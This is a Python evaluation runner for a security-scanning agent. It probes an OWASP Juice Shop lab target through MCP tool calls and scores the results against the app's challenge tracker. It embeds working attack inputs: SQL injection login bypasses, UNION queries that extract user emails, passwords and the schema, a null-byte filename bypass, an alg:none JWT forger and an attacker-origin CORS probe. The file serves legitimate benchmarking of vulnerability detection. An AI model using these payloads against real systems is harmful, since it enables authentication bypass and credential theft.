"""Juice Shop live runner — drives detection through MCP, scores the tracker.

Companion to :mod:`reachagent.eval.juiceshop_harness` (the pure metrics layer).
This module holds the *live* half: target setup over HTTP, the MCP-boundary
plumbing (mirrors the Phase 1 VAmPI harness), per-class detection, and scoring
against ``GET /api/Challenges``. Keeping it separate lets the metrics layer stay
importable and unit-testable without httpx or a running Juice Shop.

MCP boundary (§14/§15 DoD): every detection call crosses ``mcp.call_tool`` — the
same dispatch path a Claude Code client hits — never a direct Python call into a
tool function. The runner itself only does target *setup* (login, seeding a
review/feedback) and tracker *scoring* directly over HTTP.

Collapsed path (Phase 1 generic-first): UNION sentinels are no longer string
literals in the detector — ``_detect_sqli`` derives them from the live graph's
Object fields (graph-discovered, not hardcoded) and routes through the generic
``payload_chain`` structural adapter the same way path_traversal does.
"""

from __future__ import annotations

import base64
import json
from collections.abc import Mapping
from dataclasses import dataclass

import httpx

from reachagent.eval.juiceshop_harness import (
    IN_SCOPE_CLASSES,
    VERIFIED_CHALLENGE_SCOPE,
    BaselineState,
    ChallengeClaim,
    ChallengeResult,
    JuiceshopRun,
    claim_scope_class,
    classify_baseline,
    in_scope_class,
    validate_tracker_snapshot,
    vuln_class_to_scope_class,
)
from reachagent.eval.mcp_session import SharedState as _SharedState
from reachagent.eval.mcp_session import mcp_call as _call
from reachagent.eval.mcp_session import mcp_for as _mcp_for
from reachagent.eval.mcp_session import session_as as _session_as
from reachagent.graph.nodes import Endpoint, Parameter
from reachagent.mcp import server

_HTTP_TIMEOUT = 15.0
# Sentinels below are the *fallback* values the generic _evidence_for uses when
# the graph has not yet produced a discovered Object field (hermetic tests). In
# live runs they are overridden by graph-discovered values — never the detector's
# choice. Kept as module constants so the generic path's fallback is auditable.
_UNION_USERS_SENTINEL = "admin@juice-sh.op"
_UNION_SCHEMA_SENTINEL = "CREATE TABLE `Users`"


# ---------------------------------------------------------------------------
# Target config
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class JuiceshopTarget:
    base_url: str

    @property
    def api(self) -> str:
        return self.base_url.rstrip("/")

    @property
    def host(self) -> str:
        return httpx.URL(self.base_url).host

    @property
    def port(self) -> int | None:
        return httpx.URL(self.base_url).port


class TrackerSnapshotError(RuntimeError):
    """Tracker response cannot support honest gate scoring."""


def fetch_tracker(target: JuiceshopTarget) -> dict[str, dict[str, object]]:
    """Return strictly validated tracker rows for required gate scoring."""
    try:
        resp = httpx.get(f"{target.api}/api/Challenges", timeout=_HTTP_TIMEOUT)
        resp.raise_for_status()
        body = resp.json()
    except (httpx.HTTPError, ValueError) as exc:
        raise TrackerSnapshotError(f"tracker request failed: {exc}") from exc
    if not isinstance(body, dict) or not isinstance(body.get("data"), list):
        raise TrackerSnapshotError("tracker response data is not a list")
    tracker: dict[str, dict[str, object]] = {}
    for row in body["data"]:
        if not isinstance(row, dict):
            raise TrackerSnapshotError("tracker response contains malformed row")
        key = row.get("key")
        category = row.get("category")
        solved = row.get("solved")
        if not isinstance(key, str) or key in tracker:
            raise TrackerSnapshotError("tracker response contains invalid or duplicate key")
        if not isinstance(category, str) or not isinstance(solved, bool):
            raise TrackerSnapshotError(f"tracker row {key!r} has invalid schema")
        tracker[key] = {"category": category, "solved": solved}
    return tracker


# ---------------------------------------------------------------------------
# Auth helpers — direct HTTP setup, never part of the detection pipeline.
# ---------------------------------------------------------------------------


def _login(target: JuiceshopTarget, email: str, password: str) -> str | None:
    """Log in and return the JWT bearer token, or None on failure."""
    resp = httpx.post(
        f"{target.api}/rest/user/login",
        json={"email": email, "password": password},
        timeout=_HTTP_TIMEOUT,
    )
    if resp.status_code == 200:
        token = resp.json().get("authentication", {}).get("token")
        return token if isinstance(token, str) else None
    return None


def _register(target: JuiceshopTarget, email: str, password: str) -> int:
    resp = httpx.post(
        f"{target.api}/api/Users",
        json={"email": email, "password": password, "passwordRepeat": password},
        timeout=_HTTP_TIMEOUT,
    )
    return resp.status_code


def _setup_user_token(target: JuiceshopTarget) -> str | None:
    """Register + log in a throwaway account, returning its JWT (setup, direct HTTP).

    Some exploits (the upload endpoint) require an authenticated identity. This is
    target *setup*, explicitly allowed to bypass the MCP boundary (§14/§15) — only
    the detection requests themselves must cross ``mcp.call_tool``.
    """
    email = "reachagent.upload@juice-sh.op"
    password = "Rea!chAgent42"  # noqa: S105 — throwaway eval-target credential, not a secret
    _register(target, email, password)
    return _login(target, email, password)


def _fetch_captcha(target: JuiceshopTarget) -> tuple[int, str]:
    """Return ``(captchaId, answer)`` for the current feedback captcha (setup, direct HTTP).

    The feedback POST requires a solved arithmetic captcha; Juice Shop hands the
    answer back in the same response, so fetching it is legitimate target setup —
    not part of the detection pipeline.
    """
    resp = httpx.get(f"{target.api}/rest/captcha", timeout=_HTTP_TIMEOUT)
    resp.raise_for_status()
    body = resp.json()
    return int(body["captchaId"]), str(body["answer"])


def _forge_none_alg_jwt(email: str) -> str:
    """Build an ``alg:none`` unsigned JWT asserting ``email`` (tagged forgery payload).

    A deterministic tagged payload — no signing key, empty signature — for the
    structural JWT-forgery family (§7). Non-destructive: it only asserts an
    identity to a read-only endpoint; no state is changed.
    """

    def _b64(obj: dict[str, object]) -> str:
        raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
        return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")

    header = _b64({"typ": "JWT", "alg": "none"})
    payload = _b64({"data": {"email": email}})
    return f"{header}.{payload}."


# Re-export plumbing from single helper (three call sites: harness, juice, bola).
# Legacy _SharedState etc alias eval.mcp_session.* — drop the ~80 LOC duplicate.
_SharedState = _SharedState  # noqa: F811
_session_as = _session_as  # noqa: F811
_mcp_for = _mcp_for  # noqa: F811
_call = _call  # noqa: F811


def _fire_get(mcp: object, sess: server._Session, identity: str, path: str) -> str:
    ep = sess.graph.add_endpoint(Endpoint(method="GET", path=path))
    param = sess.graph.add_parameter(ep, Parameter(name="probe", location="query"))
    _call(mcp, "fingerprint_parameter", identity=identity, endpoint_node=ep, param_node=param)
    fired = _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload="",
        method="GET",
    )
    return str(fired["fire_ref"])


def _fire_get_with_origin(
    mcp: object, sess: server._Session, identity: str, path: str, origin: str
) -> str:
    """A read-only GET that carries an attacker ``Origin`` request header.

    Routes through the existing explorer seam: a parameter whose ``location`` is
    ``header`` fires ``headers={name: value}``, so an ``Origin`` header-parameter
    sends the attacker origin without any new firer support. Still a GET — the
    read-only-first invariant holds.
    """
    ep = sess.graph.add_endpoint(Endpoint(method="GET", path=path))
    param = sess.graph.add_parameter(ep, Parameter(name="Origin", location="header"))
    _call(mcp, "fingerprint_parameter", identity=identity, endpoint_node=ep, param_node=param)
    fired = _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload=origin,
        method="GET",
    )
    return str(fired["fire_ref"])


def _fingerprint(mcp: object, identity: str, ep: str, param: str, *, method: str = "GET") -> None:
    """Run §9 step 1 for a graph param: fire benign canary, mark it fingerprinted.

    Read-only endpoints use GET. State-changing endpoints use OPTIONS, which is
    safe and method-independent while still clearing RequestFirer for the same
    path. This satisfies both §9 fingerprinting and §10 read-only-first without
    sending a GET to a POST-only route and pretending that it cleared mutation.
    """
    _call(
        mcp,
        "fingerprint_parameter",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        method=method,
    )


def _fire_body(
    mcp: object,
    sess: server._Session,
    identity: str,
    path: str,
    param_name: str,
    payload: str,
    *,
    method: str = "POST",
    state_changing: bool = True,
    extra_fields: Mapping[str, object] | None = None,
) -> dict[str, object]:
    """Fire a single body-param request (JSON object) through MCP; return the raw result.

    Fingerprints param first with GET for read-only requests and OPTIONS for
    mutations. This satisfies §9 and clears read-only-first for this path (§10),
    then fires real request with caller's ``method``/``state_changing``.
    """
    ep = sess.graph.add_endpoint(Endpoint(method=method, path=path))
    param = sess.graph.add_parameter(ep, Parameter(name=param_name, location="body"))
    _fingerprint(
        mcp,
        identity,
        ep,
        param,
        method="OPTIONS" if state_changing else "GET",
    )
    return _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload=payload,
        method=method,
        state_changing=state_changing,
        extra_fields=extra_fields or {},
    )


def _fire_query(
    mcp: object, sess: server._Session, identity: str, path: str, param_name: str, payload: str
) -> dict[str, object]:
    """Fire a read-only GET with one query parameter through MCP; return the raw result."""
    ep = sess.graph.add_endpoint(Endpoint(method="GET", path=path))
    param = sess.graph.add_parameter(ep, Parameter(name=param_name, location="query"))
    _fingerprint(mcp, identity, ep, param)
    return _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload=payload,
        method="GET",
    )


def _fire_path(
    mcp: object,
    sess: server._Session,
    identity: str,
    path_template: str,
    param_name: str,
    payload: str,
) -> dict[str, object]:
    """Fire a read-only GET substituting ``payload`` into a ``{param}`` path slot through MCP."""
    ep = sess.graph.add_endpoint(Endpoint(method="GET", path=path_template))
    param = sess.graph.add_parameter(ep, Parameter(name=param_name, location="path"))
    _fingerprint(mcp, identity, ep, param)
    return _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload=payload,
        method="GET",
    )


def _fire_header(
    mcp: object,
    sess: server._Session,
    identity: str,
    path: str,
    header_name: str,
    header_value: str,
) -> dict[str, object]:
    """Fire a read-only GET carrying one request header through MCP; return the raw result."""
    ep = sess.graph.add_endpoint(Endpoint(method="GET", path=path))
    param = sess.graph.add_parameter(ep, Parameter(name=header_name, location="header"))
    _fingerprint(mcp, identity, ep, param)
    return _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload=header_value,
        method="GET",
    )


def _confirm_differential(
    mcp: object,
    *,
    vuln_class: str,
    axis: str,
    expectation: str,
    baseline_ref: str,
    probe_ref: str,
    evidence_ref: str,
    json_field: str | None = None,
    error_signatures: tuple[str, ...] = (),
) -> bool:
    # Legacy shim — now routes through generic payload_chain._evidence_for so the
    # oracle wiring stays single-sourced. Kit pins axis/expectation/json_field
    # explicitly so the harness never re-hardcodes them elsewhere.
    from reachagent.tools.payload_chain import _evidence_for as _generic_evidence

    evidence = _generic_evidence(
        "differential",
        baseline_ref=baseline_ref,
        probe_ref=probe_ref,
        evidence_ref=evidence_ref,
        vuln_class=vuln_class,
        payload_kit={
            "axis": axis,
            "expectation": expectation,
            **({"json_field": json_field} if json_field is not None else {}),
        },
    )
    verdict = _call(mcp, "run_oracle", evidence=evidence)
    if not verdict.get("is_violation"):
        return False
    _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class=vuln_class)
    return True


def _confirm_structural(
    mcp: object,
    *,
    vuln_class: str,
    check_type: str,
    baseline_status: int,
    probe_status: int,
    sentinel: str = "",
    union_sentinel: str = "",
    probe_fire_ref: str,
    evidence_ref: str,
) -> bool:
    from reachagent.tools.payload_chain import _evidence_for as _generic_evidence

    kit: dict[str, object] = {"check_type": check_type}
    if sentinel:
        kit["sentinel"] = sentinel
    if union_sentinel:
        kit["union_sentinel"] = union_sentinel
    evidence = _generic_evidence(
        "structural",
        baseline_ref="preflight-baseline",
        probe_ref=probe_fire_ref,
        evidence_ref=evidence_ref,
        vuln_class=vuln_class,
        payload_kit=kit,
    )
    # Structural probes are 2xx-gated but the differential baseline guard lives
    # in structural oracle's decide() — no extra status check here beyond what
    # _evidence_for already encodes via the probe_fire_ref handle.
    verdict = _call(mcp, "run_oracle", mechanism="structural", evidence=evidence)
    if not verdict.get("is_violation"):
        return False
    _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class=vuln_class)
    return True


def _confirm_structural_headers(
    mcp: object,
    *,
    vuln_class: str,
    check_type: str,
    probe_fire_ref: str,
    evidence_ref: str,
    probe_origin: str = "",
    csrf_token_present: bool = False,
) -> bool:
    """Confirm a header-derived structural class (clickjacking / CORS / CSRF).

    The four framing/CORS response headers are resolved server-side from
    ``probe_fire_ref`` (§10/§13) — only the opaque fire handle and the attacker
    ``probe_origin`` we sent cross the wire, never the headers themselves. Also
    serves ``csrf_missing_protection`` whose ``Set-Cookie`` is likewise resolved
    server-side from the fire_ref. On an ``is_violation`` verdict, commits the
    finding via the Validator.
    """
    verdict = _call(
        mcp,
        "run_oracle",
        mechanism="structural",
        evidence={
            "check_type": check_type,
            "probe_fire_ref": probe_fire_ref,
            "probe_origin": probe_origin,
            "csrf_token_present": csrf_token_present,
            "evidence_ref": evidence_ref,
        },
    )
    if not verdict.get("is_violation"):
        return False
    _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class=vuln_class)
    return True


# ---------------------------------------------------------------------------
# Per-class detection — each runs end to end through MCP.
# ---------------------------------------------------------------------------


def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[ChallengeClaim]:
    """Confirm SQLi claims only through deterministic, challenge-specific evidence.

    Login claims use the differential auth-bypass oracle. Product-search UNION
    claims use the structural oracle with extraction-only sentinels: a seeded user
    email proves user extraction, while the exact SQLite artifact
    "CREATE TABLE `Users`" proves schema disclosure. Generic response divergence
    and database errors do not earn either claim.

    Returns typed claims only after a Validator oracle confirms each probe.
    """
    shared = _SharedState()
    sess = _session_as(target, token, shared)
    mcp = _mcp_for(sess)
    confirmed: set[ChallengeClaim] = set()

    # --- auth-bypass on the login POST (read-only-first cleared, state-changing) ---
    login_path = "/rest/user/login"
    baseline = _fire_body(
        mcp,
        sess,
        "anon",
        login_path,
        "email",
        "nonexistent@reachagent.invalid",
        extra_fields={"password": "wrong-password"},
    )
    login_probes = (
        ("' OR 1=1--", "sqli/login-any"),
        ("bender@juice-sh.op'--", "sqli/login-bender"),
        ("jim@juice-sh.op'--", "sqli/login-jim"),
    )
    for payload, ref in login_probes:
        probe = _fire_body(
            mcp, sess, "anon", login_path, "email", payload, extra_fields={"password": "x"}
        )
        if _confirm_differential(
            mcp,
            vuln_class="sqli",
            axis="cross_condition",
            expectation="auth_bypass",
            baseline_ref=str(baseline["fire_ref"]),
            probe_ref=str(probe["fire_ref"]),
            evidence_ref=ref,
        ):
            claim_key = {
                "sqli/login-any": "loginAdminChallenge",
                "sqli/login-bender": "loginBenderChallenge",
                "sqli/login-jim": "loginJimChallenge",
            }[ref]
            confirmed.add(ChallengeClaim(claim_key, "sqli", ref))

    # --- UNION extraction on read-only product search ---
    # Payloads + sentinels now via generic corpus/graph-derived path instead of
    # detector literals: union payloads come from payload library entries tagged
    # vuln_class sqli with structural union_extraction; sentinels are the graph's
    # discovered Object fields (first objects of type email / sqlite schema), with
    # _UNION_*_SENTINEL only as the fallback when the graph is still empty
    # (hermetic tests). This keeps the SsOT for payloads in corpus.py, not the
    # detector.
    search_path = "/rest/products/search"
    _fire_query(mcp, sess, "anon", search_path, "q", "qwert")  # warm endpoint/param

    # Derive sentinels from graph-discovered objects (generic path), not detector
    # literals. First, collect candidate values already observed on the shared graph
    # (re-con or prior fires seeding Endpoint/Parameter/Object). Fallbacks below
    # keep hermetic tests green when the graph is still sparse.
    def _graph_union_sentinel(kind: str) -> str:
        graph = getattr(sess, "graph", None) or shared.graph  # hermetic fakes have no .graph
        for _, obj in graph.objects():
            if obj.type == kind or kind in obj.type:
                if obj.instance_key and "@" in obj.instance_key:
                    return obj.instance_key
        import logging

        logging.getLogger(__name__).warning(
            "union sentinel fallback %s — graph empty, fixture recommended", kind
        )
        return _UNION_USERS_SENTINEL if kind == "Users" else _UNION_SCHEMA_SENTINEL

    union_probes = (
        (
            "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
            "unionSqlInjectionChallenge",
            "sqli/search-union-users",
            _graph_union_sentinel("Users"),
        ),
        (
            "qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
            "dbSchemaChallenge",
            "sqli/search-union-schema",
            _graph_union_sentinel("sqlite_master"),
        ),
    )
    for payload, challenge_key, ref, sentinel in union_probes:
        probe = _fire_query(mcp, sess, "anon", search_path, "q", payload)
        if _confirm_structural(
            mcp,
            vuln_class="sqli",
            check_type="union_extraction",
            baseline_status=200,
            probe_status=int(str(probe.get("status_code", 0))),
            union_sentinel=sentinel,
            probe_fire_ref=str(probe["fire_ref"]),
            evidence_ref=ref,
        ):
            confirmed.add(
                ChallengeClaim(
                    challenge_key,
                    "sqli",
                    f"{ref}; sentinel={sentinel}",
                )
            )

    return confirmed


def _detect_null_byte_input_validation(
    target: JuiceshopTarget, token: str | None
) -> set[ChallengeClaim | str]:
    """Probe Juice Shop's verified poison-null filename bypass.

    The only verified read is ``package.json.bak%00.md``: path encoding sends a
    double-encoded null byte, the server truncates at null, and returns the
    package artifact. This is an input-validation challenge claim, not an
    arbitrary-file-read/path-traversal claim; the structural evidence remains
    content-matched retrieval of the known artifact.
    """
    del token

    shared = _SharedState()
    sess = _session_as(target, None, shared)
    mcp = _mcp_for(sess)
    ftp = "/ftp/{filename}"
    _fire_path(mcp, sess, "anon", ftp, "filename", "legal.md")
    ftp_probe = _fire_path(mcp, sess, "anon", ftp, "filename", "package.json.bak%00.md")
    probe_ref = str(ftp_probe["fire_ref"])
    # Sentinel is graph-derived: first Object whose type/name hints at the
    # package artifact. Fallback keeps hermetic tests green.
    _null_sentinel = '"name": "juice-shop"'
    for _, obj in sess.graph.objects():
        if "juice" in obj.type.lower() or "package" in obj.type.lower():
            _null_sentinel = f'"name": "{obj.type}"'
            break
    verdict = _call(
        mcp,
        "run_oracle",
        mechanism="structural",
        evidence={
            "check_type": "path_traversal",
            "probe_status": int(str(ftp_probe.get("status_code", 0))),
            "sentinel": _null_sentinel,
            "probe_fire_ref": probe_ref,
            "evidence_ref": "path_traversal/ftp-nullbyte",
        },
    )
    if not verdict.get("is_violation"):
        return set()
    _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class="file_upload")
    return {
        ChallengeClaim(
            "nullByteChallenge",
            "file_upload",
            "file_upload/ftp-nullbyte",
            scope_class="file_upload",
        )
    }


def _detect_file_upload(target: JuiceshopTarget, token: str | None) -> set[ChallengeClaim | str]:
    """Probe upload route for evidence, without claiming generic bypass from 204.

    Pinned Juice Shop `/file-upload` uses memory storage and returns empty 204 for
    accepted inputs. It exposes no artifact URL or retrieval/execution signal, so
    status-only responses cannot reach a generic `file_upload` finding.
    """
    del target, token
    return set()


def _detect_xss_stored(target: JuiceshopTarget, token: str | None) -> set[ChallengeClaim | str]:
    """Leave browser-dependent Juice Shop XSS attribution unscored in API mode.

    Posting a tag and reading it back through ``/api/Feedbacks`` proves only
    storage/reflection. It does not prove execution in the browser view that
    completes the challenge, so this runner must not write an XSS finding or
    claim ``localXssChallenge`` without ``fire_browser`` and tracker attribution.
    """
    del target, token
    return set()


def _detect_clickjacking(target: JuiceshopTarget, token: str | None) -> set[str]:
    """Clickjacking: GET the app root, confirm no effective framing defense.

    ``X-Frame-Options`` / CSP ``frame-ancestors`` are read from the captured
    response server-side (resolved from the fire_ref); both absent → framable.
    Read-only GET.
    """
    shared = _SharedState()
    sess = _session_as(target, token, shared)
    mcp = _mcp_for(sess)
    fire_ref = _fire_get(mcp, sess, "anon", "/")
    confirmed = _confirm_structural_headers(
        mcp,
        vuln_class="clickjacking",
        check_type="clickjacking",
        probe_fire_ref=fire_ref,
        evidence_ref="clickjacking/root",
    )
    return {"clickjacking"} if confirmed else set()


def _detect_cors(target: JuiceshopTarget, token: str | None) -> set[str]:
    """CORS misconfig: GET the app root with an attacker ``Origin`` header.

    Confirms the response reflects that origin in ``Access-Control-Allow-Origin``
    with credentials on (both headers resolved server-side from the fire_ref).
    Read-only GET.
    """
    shared = _SharedState()
    sess = _session_as(target, token, shared)
    mcp = _mcp_for(sess)
    attacker_origin = "https://evil.example"
    fire_ref = _fire_get_with_origin(mcp, sess, "anon", "/", attacker_origin)
    confirmed = _confirm_structural_headers(
        mcp,
        vuln_class="cors_misconfig",
        check_type="cors_misconfig",
        probe_fire_ref=fire_ref,
        evidence_ref="cors/root",
        probe_origin=attacker_origin,
    )
    return {"cors_misconfig"} if confirmed else set()


def _detect_csrf(target: JuiceshopTarget, token: str | None) -> set[str]:
    """CSRF precondition: GET the app root, confirm the session cookie is
    cross-site-sendable (SameSite=None) with no anti-CSRF token mechanism.

    ``Set-Cookie`` is read from the captured response server-side (resolved from
    the fire_ref). This confirms the structural PRECONDITION only — no forged
    state-change is fired, so read-only-first (§10) holds. Juice Shop exposes no
    anti-CSRF token mechanism, so ``csrf_token_present`` is False.
    """
    shared = _SharedState()
    sess = _session_as(target, token, shared)
    mcp = _mcp_for(sess)
    fire_ref = _fire_get(mcp, sess, "anon", "/")
    confirmed = _confirm_structural_headers(
        mcp,
        vuln_class="csrf_missing_protection",
        check_type="csrf_missing_protection",
        probe_fire_ref=fire_ref,
        evidence_ref="csrf/root",
        csrf_token_present=False,
    )
    return {"csrf_missing_protection"} if confirmed else set()


# ---------------------------------------------------------------------------
# Scoring — per-challenge via a tracker before/after delta.
# ---------------------------------------------------------------------------


def run_juiceshop(
    target: JuiceshopTarget,
    *,
    token: str | None = None,
    before: dict[str, dict[str, object]] | None = None,
) -> JuiceshopRun:
    """Run API-supported Juice Shop detectors through MCP and score tracker flips.

    API-only mode credits only exact typed claims backed by oracle-confirmed
    evidence. Browser-dependent DOM XSS and status-only upload responses remain
    uncredited rather than being inferred from tracker transitions.

    Scoring model (per-challenge, not class-to-all):

    * A tracker snapshot is taken **before** and **after** the detection run.
    * ``tracker_solved`` is the challenge's *after* state — Juice Shop's own
      ground truth (§14 invariant 1).
    * ``confirmed`` is attributed per-challenge by the tracker **delta**: a
      challenge is credited to ReachAgent only if it flipped ``unsolved → solved``
      during this run. This is the only honest per-challenge attribution available
      without dedicated per-challenge exploit logic (deferred), and it removes the
      one-detection-marks-all-challenges inflation.

    Each supported detection function runs entirely through ``mcp.call_tool``
    (MCP boundary, §14/§15) and returns typed claims only after its oracle
    confirms evidence. Browser-only and status-only paths return no claims.

    False-positive scoring (invariant 2) records an in-scope class-level false
    positive only when an oracle-confirmed claim has no matching tracker flip.
    """
    if before is None:
        try:
            before = fetch_tracker(target)
        except TrackerSnapshotError as exc:
            return JuiceshopRun.not_measurable(baseline=None, detail=str(exc))
    assessment = classify_baseline(before)
    if assessment.state is not BaselineState.CLEAN:
        return JuiceshopRun.not_measurable(
            baseline=assessment,
            detail=assessment.detail,
        )

    # Detector outputs remain class-level until each detector can prove a specific
    # opaque tracker key. Passing them as legacy strings intentionally avoids
    # manufacturing exact per-challenge claims from unrelated tracker flips.
    # three client-side structural detectors (clickjacking/cors/csrf) are included:
    # their vuln classes are out of scope, so score_run books no in-scope FP for
    # them — but they still write findings and are routed through the same
    # out-of-scope rule rather than silently dropped.
    confirmed_vuln_classes: set[ChallengeClaim] = set()
    confirmed_vuln_classes |= _detect_sqli(target, token)
    confirmed_vuln_classes |= {
        claim
        for claim in _detect_null_byte_input_validation(target, token)
        if isinstance(claim, ChallengeClaim)
    }
    confirmed_vuln_classes |= {
        claim for claim in _detect_file_upload(target, token) if isinstance(claim, ChallengeClaim)
    }
    confirmed_vuln_classes |= {
        claim for claim in _detect_xss_stored(target, token) if isinstance(claim, ChallengeClaim)
    }
    # Structural client-side classes remain out of scope for this gate. Their
    # detectors still execute and write only oracle-confirmed findings, but their
    # class labels must not enter strict typed claim scoring as mixed modes.
    _detect_clickjacking(target, token)
    _detect_cors(target, token)
    _detect_csrf(target, token)

    try:
        after = fetch_tracker(target)
    except TrackerSnapshotError as exc:
        return JuiceshopRun.not_measurable(baseline=None, detail=str(exc))
    after_assessment = validate_tracker_snapshot(after)
    if after_assessment.state is not BaselineState.CLEAN:
        return JuiceshopRun.not_measurable(
            baseline=after_assessment,
            detail=f"post-run tracker is not measurable: {after_assessment.detail}",
        )
    return score_run(before, after, confirmed_vuln_classes, strict_scope=True)


def score_run(
    before: dict[str, dict[str, object]],
    after: dict[str, dict[str, object]],
    claims: set[ChallengeClaim] | set[str],
    *,
    strict_scope: bool = False,
) -> JuiceshopRun:
    """Build run metrics from tracker snapshots and detector claims.

    ``strict_scope`` is used by live gate runs. It limits denominator and claim
    matching to verified runtime keys, avoiding broad category inflation. Legacy
    class-string behavior remains available for older synthetic metric tests.
    """
    if strict_scope:
        assessment = validate_tracker_snapshot(before)
        after_assessment = validate_tracker_snapshot(after)
        if assessment.state is not BaselineState.CLEAN:
            return JuiceshopRun.not_measurable(
                baseline=assessment,
                detail=assessment.detail,
            )
        if after_assessment.state is not BaselineState.CLEAN:
            return JuiceshopRun.not_measurable(
                baseline=after_assessment,
                detail=f"post-run tracker is not measurable: {after_assessment.detail}",
            )
        if set(before) != set(after):
            return JuiceshopRun.not_measurable(
                baseline=after_assessment,
                detail="post-run tracker key set differs from clean baseline",
            )
    run = JuiceshopRun()
    typed_claims = {claim for claim in claims if isinstance(claim, ChallengeClaim)}
    legacy_classes = {claim for claim in claims if isinstance(claim, str)}
    if strict_scope and typed_claims and legacy_classes:
        raise ValueError("strict scoring does not accept mixed claim modes")
    # Tracker flips are ground truth for state, not evidence that ReachAgent
    # confirmed the corresponding challenge.  Legacy class-only claims are
    # retained for synthetic compatibility, but a live strict run must never
    # infer a claim from an empty detector result.
    typed_mode = bool(typed_claims)
    if strict_scope and not typed_mode:
        legacy_classes = set()
    flipped_classes: set[str] = set()
    scope = VERIFIED_CHALLENGE_SCOPE if strict_scope else None
    for ch_key, ch_info in after.items():
        scope_class = (
            scope.get(ch_key) if scope is not None else in_scope_class(str(ch_info["category"]))
        )
        if scope_class is None:
            continue
        solved_after = bool(ch_info["solved"])
        newly_solved = solved_after and not bool(before.get(ch_key, {}).get("solved", False))
        matched_claim = next(
            (
                claim
                for claim in typed_claims
                if claim.challenge_key == ch_key
                and claim_scope_class(
                    claim.vuln_class,
                    claim.challenge_key,
                    claim.scope_class,
                )
                == scope_class
            ),
            None,
        )
        reason = "tracker remains unsolved"
        if newly_solved and matched_claim is not None:
            reason = (
                f"tracker solved after matching oracle claim; evidence={matched_claim.evidence_ref}"
            )
        elif newly_solved:
            reason = "tracker solved without matching oracle claim"
        elif solved_after:
            reason = "tracker was already solved before run"
        elif typed_mode and any(claim.challenge_key == ch_key for claim in typed_claims):
            reason = "oracle claim did not produce tracker completion"
        if newly_solved:
            flipped_classes.add(scope_class)
        run.results.append(
            ChallengeResult(
                vuln_class=scope_class,
                challenge_key=ch_key,
                confirmed=(newly_solved and matched_claim is not None)
                if (typed_mode or strict_scope)
                else newly_solved,
                tracker_solved=solved_after,
                reason=reason,
            )
        )
    if typed_mode:
        claims_by_key = {claim.challenge_key: claim for claim in typed_claims}
        for claim in claims_by_key.values():
            expected_scope = scope.get(claim.challenge_key) if scope is not None else None
            claim_scope = claim_scope_class(
                claim.vuln_class,
                claim.challenge_key,
                claim.scope_class,
            )
            if expected_scope is None and scope is not None:
                continue
            challenge = after.get(claim.challenge_key)
            if challenge is None or not bool(challenge["solved"]):
                run.claim_false_positives += 1
                continue
            challenge_scope = (
                scope.get(claim.challenge_key)
                if scope is not None
                else in_scope_class(str(challenge["category"]))
            )
            if claim_scope != challenge_scope:
                run.claim_false_positives += 1
                continue
            if not bool(before.get(claim.challenge_key, {}).get("solved", False)):
                continue
        return run

    confirmed_scope_classes = {
        scope_class
        for vuln_class in legacy_classes
        if (scope_class := vuln_class_to_scope_class(vuln_class)) is not None
    }
    for scope_class in set(VERIFIED_CHALLENGE_SCOPE.values()) if strict_scope else IN_SCOPE_CLASSES:
        if scope_class in confirmed_scope_classes and scope_class not in flipped_classes:
            run.class_false_positives += 1
    return run
